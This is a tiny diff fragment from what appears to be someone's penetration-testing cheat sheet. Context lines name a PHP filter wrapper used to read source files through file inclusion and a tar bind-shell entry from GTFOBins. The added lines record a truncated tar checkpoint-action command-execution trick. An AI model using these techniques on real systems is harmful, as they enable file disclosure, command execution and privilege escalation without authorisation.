@@ -19,3 +19,5 @@ php://filter/convert.base64-encode/resource= RES
 
 
 github tar command Bind shell (gtfobins)
+# tar vulnerebility
+# cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=
